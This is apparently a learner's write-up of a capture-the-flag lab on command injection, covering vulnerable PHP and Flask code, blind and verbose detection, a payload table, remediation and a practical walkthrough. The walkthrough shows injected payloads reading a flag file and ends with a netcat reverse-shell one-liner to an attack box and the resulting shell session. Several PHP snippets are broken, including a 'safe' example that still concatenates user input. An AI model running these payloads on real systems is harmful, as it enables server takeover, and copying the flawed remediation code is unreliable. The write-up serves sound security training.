# Command injection

## Intro

Aka RCE, command injection allows an attacker to execute code on a remote system.

## Discovery

*This vulnerability exists because applications often use functions in programming languages such as PHP, Python and NodeJS to pass data to and to make system calls on the machine’s operating system. For example, taking input from a field and searching for an entry into a file. Take this code snippet below as an example:*

*In this code snippet, the application takes data that a user enters in an input field named `$title` to search a directory for a song title. Let’s break this down into a few simple steps.*

```php
<?php

$songs = "/var/wwww/html/songs" #1.

if (isset $ GET["title"]) {
	$title = $_GET["title"]; #2.
	$command = "grep $title /var/www/html/songtitle.txt"; #3
	$search = exec($command); #4
	if ($search == "") {
		$return = "<p>The requested song</p><p> $title does<p><b>not</b></p> exist!</p>";
	} else {
		$return = "<p>The requested song</p><p> $title does </p><b>exist!</b>";
	}

	echo $return;
}
?>
```

1. The application stores MP3 files in a directory contained on the operating system.

2. The user inputs the song title they wish to search for. The application stores this input into the `$title` variable.

3. The data within this `$title` variable is passwed to the `grep` command to search a text file named *songtitle.txt* for the entry of whatever the user wishes to search for.

4. The output of this search of *songtitle.txt* will determine whether the application informs the user that the song exists or not.

*Now, this sort of information would typically be stored in a database; however, this is just an example of where an application takes input from a user to interact with the application's operating system.*

*An attacker could abuse this application by injecting their own commands for the application to execute. Rather than using `grep` to search for an entry in `songtitle.txt`, they could ask the application to read*

*Abusing applications in this way can be possible no matter the programming language the application uses. As long as the application processes and executes it, it can result in command injection. For example, this code snippet below is an application written in Python.*

```python
import subprocess


#1 The "flask" package is used to set up a web server

from flask import Flask  
app = Flask(__name__)

#2 A function that uses the "subprocess" package to execute a command on the device

def execute_command(shell):
	return subprocess.Popen(shell, shell=True, stdout=subprocess.PIPE).stdout.read()

#3 We use a route in the webserver that will execute whatever is provided. For example, to execute "whoami", we'd need to visit http://flaskapp.thm/whoami

@app.route('/<shell>')
def command_server(shell):
	return execute_command(shell)
```

### Questions

1. What variable stores the user's input in the PHP code snippet in this task?

`title`

2. What HTTP method is used to retrieve data submitted by a user in the PHP code snippet.

`GET`

3. If I wanted to execute the `id` command in the Python code snippet, what route would I need to visit?

`/id`



## 3) Exploiting Command Injection

*Applications that use user input to populate system commands with data can often be combined in unintended behaviour. For example, the shell operators `;`, `&` and `&&` will combine two (or more) system commands and execute them both. If you are unfamiliar with this concept, it is worth checking out the Linux fundamentals module to learn more about this.*

Command Injetion can be detected in mostly one of two ways:

1. **Blind** command injection
2. **Verbose** command injection

| Method | Description |
| - | - |
| **Blind** | This type of injection is where there is no direct output from the application when testing payloads. You will have to investigate the behaviours of the application to determine whether or not your payload was successful |
| **Verbose** | This type of injection is where there is direct feedback from the application once you have tested a payload. For example, running the `whoami` command to see what user the application is running under. The web application will output the username on the page directly. |


### Detecting Blind Command Injection

Blind command injection is when command injection occurs; however, there is no output visible, so it is not immediately noticeable. For example, a command is executed, but the web application outputs no message.

#### Using Ping and sleep

For this type of command injection, we will nedd to use payloads that will cause some time delay. For example, the `ping` and `sleep` commands are significant payloads to test with. Using `ping` as an example, the application will hang for x seconds in relation to how many *pings* you have specified.

#### Forcing output

Another method of detecting blind command injection is by forcing some output. This can be done by using redirction operators such as `>`. For example, we can tell the web application to execute commands such as `whoami` and redirect that to a file. We can then use a command such as `cat` to read this newly created file's contents.

Testing command injection this way is often complicated and requires quite a bit of experimentation, significantly as the syntax for commands varies between Linux and Windows.

#### Using curl

The `curl` command is a great way to test for command injection. This is because you are able to use `curl` to deliver data to and from and application in your payload. Take this code snippet below as an example, a simple curl payload to an application in possible for command injection.

```bash
curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami
```


### Detecting Verbose Command Injection

Detecting command injection in this way is arguably the easiest method of the two. Verbose command injection is when the application give you feedback or output as to what is happening or being executed.

For example, the output of commands such as `ping` or `whoami` is directly displayed on the web application.


### Useful payloads

I have compiled some valuable payloads for both Linux & Windows into the tables below.

#### Linux

|Payload | Description |
| - | - |
|whoami	| See what user the application is running under. |
| ls | List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things.|
| ping | This command will invoke the application to hang. This will be useful in testing an application for blind command injection. |
| sleep | This is another useful payload in testing an application for blind command injection, where the machine does not have ping installed. |
| nc | Netcat can be used to spawn a reverse shell onto the vulnerable application. You can use this foothold to navigate around the target machine for other services, files, or potential means of escalating privileges. |


#### Windows

| Payload | Description |
| - | - |
|whoami	| See what user the application is running under. |
| dir | List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things. |
| ping	| This command will invoke the application to hang. This will be useful in testing an application for blind command injection. |
| timeout | This command will also invoke the application to hang. It is also useful for testing an application for blind command injection if the `ping` command is not installed. |

### Questions

 What payload would I use if I wanted to determine what user the application is running as? 

`whoami`

What popular network tool would I use to test for blind command injection on a Linux machine?

`ping`


What payload would I use to test a Windows machine for blind command injection?

`timeout`


---
## Remediating Command Injection



Command injection can be prevented in a variety of ways. Everything from minimal use of potentially dangerous functions or libraries in a programming language to filtering input without relying on a user’s input. I have detailed these a bit further below. The examples below are of the PHP programming language; however, the same principles can be extended to many other languages.

### Vulnerable Functions

In PHP, many functions interact with the operating system to execute commands via shell; these include:

- Exec
- Passthru
- System



Take this snippet below as an example. Here, the application will only accept and process nembers that are inputted into the form. This means that any commands such as `whoami` will not be processed.

```php

<input type="text" id="ping" name="ping" pattern="[0-9]+"></input> # 1.

<?php
echo passthru("/bin/ping -c 4"$_GET["ping"].');                    # 2.

?>
```

1. The application will only accept a specific pattern of characters (the digits 0-9)

2. The application will then only proceed to execute this data wich is all numerical


These functions take input such as a string or user data and will execute whatever is provided on the system. Aniy application that uses these functions without proper checks will be vulnerable to command injection.


### Input Sanitisation

Sanitising any input from a user that an application uses is a great way to prevent command injection. This is a process of specifying the formats or types of data that a user can submit. For example , an input field that only accepts numerical data or removes any special characters such as `>`, `&`, and `/`

in the snippet below, the `filter_input` php function is used to check whether or not any data submitted via an input form is a number or not. If it is not a number, it must be invalid input.

```php
<?php

if (!filter_input(INPUT_GET, "number", FILTER_VALIDATE_NUMBER)) {

}
```

### Bypassing Filters 

Application will employ numerous techniques in filtering and sanitising data that is taken from a user's input. These filters will restrict you to specific payloads; however, we can abuse the logic behind an application to bypass these filters. For example, an application may strip out quotation marks; we can instead use the hexadecimal value of this to achieve the same result.

```php
$payload = "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
```
using xxd we can see what that is in ascii

```bash
└─$ echo \x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64|xxd -r -p
/etc/passwd                                                                                                                   
```

### Questions

 What is the term for the process of "cleaning" user input that is provided to an application? 
`sanitisation`


## Practical: Command Injection

Test some payloads on the application hosted on the website visible in split-screen view to test for command injection. Refer to [this](https://github.com/payloadbox/command-injection-payload-list) cheat sheet if you are stuck or wish to explore some more complex payloads.

Find the contents of the flag located in /home/tryhackme/flag.txt. You can use a variety of payloads to achieve this – I recommend trying multiple.

### Questions

 What user is this application running as? 

 So seeing that I can enter `localhost` and it still resolves to 127.0.0.1 I know that the app doesn't just take numbers as input, so I can use a semicolon to signify to the server that I want to run an additional command. If I want to see who I am running as I can add `;whoami` and since is verbose command injection I should get the output of whoami after the output of ping:

 ```
Here is your command: 127.0.0.1;whoami

Output:
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.016 ms 64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.031 ms 64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.032 ms 64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.030 ms --- 127.0.0.1 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3080ms rtt min/avg/max/mdev = 0.016/0.027/0.032/0.006 ms www-data 
 ```
so the answer is www-data


 What are the contents of the flag located in /home/tryhackme/flag.txt?

 Next lets see if I can get the contents using the same technique:

 ```
 Here is your command: localhost;cat /home/tryhackme/flag.txt

Output:
PING localhost (127.0.0.1) 56(84) bytes of data. 64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.015 ms 64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.030 ms 64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.031 ms 64 bytes from localhost (127.0.0.1): icmp_seq=4 ttl=64 time=0.033 ms --- localhost ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3078ms rtt min/avg/max/mdev = 0.015/0.027/0.033/0.007 ms THM{COMMAND_INJECTION_COMPLETE} 
```

and bingo we get the flag


## Conclusion

Okay so they are asking for other ways to get that last flag, the most fun way in my opinion is to see if we can get the server to send us a reverse shell. First lets see if netcat is on the server:

```
Here is your command: 127.0.0.1;which nc

Output:
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.016 ms 64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.030 ms 64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.030 ms 64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.030 ms --- 127.0.0.1 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3062ms rtt min/avg/max/mdev = 0.016/0.026/0.030/0.006 ms /usr/bin/nc 
```

Great! Now lets use this nc revshell payload after starting a listener on our attack box

`nc -lvnp 9001`

```bash
localhost;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.77.38 9001 >/tmp/f
```

and we can get a shell back


```bash
└─$ nc -lvnp 9001               
listening on [any] 9001 ...
connect to [10.6.77.38] from (UNKNOWN) [10.10.95.246] 44210
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ cat  /home/tryhackme/flag.txt 
THM{COMMAND_INJECTION_COMPLETE}
$ 

```

From here an attacker can potentially PE to root and have total controll of the server.
